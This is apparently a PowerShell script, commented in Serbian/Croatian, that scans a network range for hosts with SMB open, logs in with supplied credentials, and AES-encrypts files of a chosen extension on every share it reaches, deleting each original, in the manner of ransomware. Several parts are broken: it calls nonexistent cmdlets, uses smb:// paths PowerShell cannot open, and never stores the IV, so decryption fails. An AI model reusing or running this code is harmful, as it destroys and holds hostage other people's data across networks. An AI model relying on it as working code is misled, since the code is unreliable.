#PAZI ŠTA RADIŠ!



param (
    [Parameter(Mandatory = $true)]
    [string]$smbUsername,

    [Parameter(Mandatory = $true)]
    [string]$smbPassword
)

function Encrypt-File {
    param (
        [Parameter(Mandatory = $true)]
        [string]$filePath,

        [Parameter(Mandatory = $true)]
        [string]$encryptionKey,

        [Parameter(Mandatory = $true)]
        [string]$logFilePath
    )

    $inputFile = Get-Item -Path $filePath
    if ($inputFile -eq $null) {
        throw "Failed to open file: $filePath"
    }

    $outputFile = $filePath + ".encrypted"
    $encryptedContent = Get-Content -Path $filePath -Encoding Byte

    $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $cipher.KeySize = 256
    $cipher.BlockSize = 128

    $iv = $cipher.IV
    $encryptor = $cipher.CreateEncryptor([System.Text.Encoding]::UTF8.GetBytes($encryptionKey), $iv)

    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    $cryptoStream.Write($encryptedContent, 0, $encryptedContent.Length)
    $cryptoStream.FlushFinalBlock()

    $encryptedBytes = $memoryStream.ToArray()
    $encryptedFile = [System.IO.File]::OpenWrite($outputFile)
    $encryptedFile.Write($encryptedBytes, 0, $encryptedBytes.Length)
    $encryptedFile.Close()

    $inputFile.Delete()

    # Log fajl enkripcije
    $logEntry = "File encrypted: $filePath"
    Add-Content -Path $logFilePath -Value $logEntry
}

function Decrypt-File {
    param (
        [Parameter(Mandatory = $true)]
        [string]$filePath,

        [Parameter(Mandatory = $true)]
        [string]$encryptionKey,

        [Parameter(Mandatory = $true)]
        [string]$logFilePath
    )

    $inputFile = Get-Item -Path $filePath
    if ($inputFile -eq $null) {
        throw "Failed to open file: $filePath"
    }

    $outputFile = $filePath -replace '\.encrypted$', ''
    $encryptedContent = Get-Content -Path $filePath -Encoding Byte

    $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $cipher.KeySize = 256
    $cipher.BlockSize = 128

    $iv = $cipher.IV
    $decryptor = $cipher.CreateDecryptor([System.Text.Encoding]::UTF8.GetBytes($encryptionKey), $iv)

    $memoryStream = New-Object System.IO.MemoryStream($encryptedContent)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

    $decryptedBytes = New-Object byte[] $encryptedContent.Length
    $bytesRead = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)

    $cryptoStream.Close()
    $memoryStream.Close()

    $outputFileHandle = [System.IO.File]::OpenWrite($outputFile)
    $outputFileHandle.Write($decryptedBytes, 0, $bytesRead)
    $outputFileHandle.Close()

    $inputFile.Delete()

    $logEntry = "File decrypted: $filePath"
    Add-Content -Path $logFilePath -Value $logEntry
}

# Skeniraj CIDR za SMB share-ove
function Scan-CIDRForSMBShares {
    param (
        [Parameter(Mandatory = $true)]
        [string]$cidrRange,

        [Parameter(Mandatory = $true)]
        [string]$fileExtension,

        [Parameter(Mandatory = $true)]
        [string]$encryptionKey,

        [Parameter(Mandatory = $true)]
        [string]$logFilePath
    )

    $ips = (Get-IPAddress -AddressFamily IPv4 -PrefixLength 32).IPAddressToString
    $networkAddress = [System.Net.IPAddress]::Parse($ips[0])
    $cidr = (New-Object System.Net.IPAddress($networkAddress.GetAddressBytes(), $cidrRange))

    $network = [System.Net.IPNetwork]::new($cidr)
    $ipRange = $network.GetEnumerator()

    while ($ipRange.MoveNext()) {
        $ip = $ipRange.Current.IPAddressToString

        $result = Test-NetConnection -ComputerName $ip -Port 445 -InformationLevel Quiet -ErrorAction SilentlyContinue
        if ($result -eq 'True') {
            # SMB share-ovi u log
            $logEntry = "Found SMB share: $ip"
            Add-Content -Path $logFilePath -Value $logEntry

            # Connect to the SMB share
            $smbURL = "smb://$ip/"

            try {
                # SMB credovi
                $smbCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $smbUsername, ($smbPassword | ConvertTo-SecureString -AsPlainText -Force)

                # Provjeri dostupne share-ove
                $smbShares = Get-SmbShare -Credential $smbCreds -Special $false -ErrorAction Stop -ScopeName $smbURL

                foreach ($smbShare in $smbShares) {
                    # Write the share to the log file
                    $logEntry = "Share: $($smbShare.Name)"
                    Add-Content -Path $logFilePath -Value $logEntry

                    # recursive
                    $smbFiles = Get-SmbChildItem -Credential $smbCreds -Path ($smbURL + $smbShare.Name) -File -ErrorAction SilentlyContinue

                    if ($smbFiles) {
                        foreach ($smbFile in $smbFiles) {
                            $filePath = $smbURL + $smbShare.Name + "/" + $smbFile.Name

                            # provjeri ekstenzije
                            $extension = [System.IO.Path]::GetExtension($smbFile.Name)
                            $extension = $extension.TrimStart('.')

                            if ($extension -eq $fileExtension) {
                                try {
                                    # Kriptiraj
                                    Encrypt-File -filePath $filePath -encryptionKey $encryptionKey -logFilePath $logFilePath
                                } catch {
                                    $errorMessage = "Failed to encrypt file: $($_.Exception.Message)"
                                    Add-Content -Path $logFilePath -Value $errorMessage
                                }
                            } elseif ($extension -eq "encrypted") {
                                try {
                                    # Dekriptiraj
                                    Decrypt-File -filePath $filePath -encryptionKey $encryptionKey -logFilePath $logFilePath
                                } catch {
                                    $errorMessage = "Failed to decrypt file: $($_.Exception.Message)"
                                    Add-Content -Path $logFilePath -Value $errorMessage
                                }
                            }
                        }
                    }
                }
            } catch {
                $errorMessage = "Failed to connect to SMB share: $($_.Exception.Message)"
                Add-Content -Path $logFilePath -Value $errorMessage
            }
        }
    }
}

# input
$smbUsername = Read-Host "SMB Username"
$smbPassword = Read-Host -AsSecureString "SMB password"
$cidrRange = Read-Host "CIDR notacija"
$fileExtension = Read-Host "Enter the file extension to encrypt ukoliko treba decrypt automatski bi trebao odradit u protivnom staviti .encrypted ekstenziju"
$encryptionKey = Read-Host -AsSecureString "Encryption key"
$encryptionKey = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($encryptionKey))
$logFilePath = Read-Host "Log file path"

# Secure string
$smbPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($smbPassword))

# Sken CIDR scope-a
Scan-CIDRForSMBShares -cidrRange $cidrRange -fileExtension $fileExtension -encryptionKey $encryptionKey -logFilePath $logFilePath
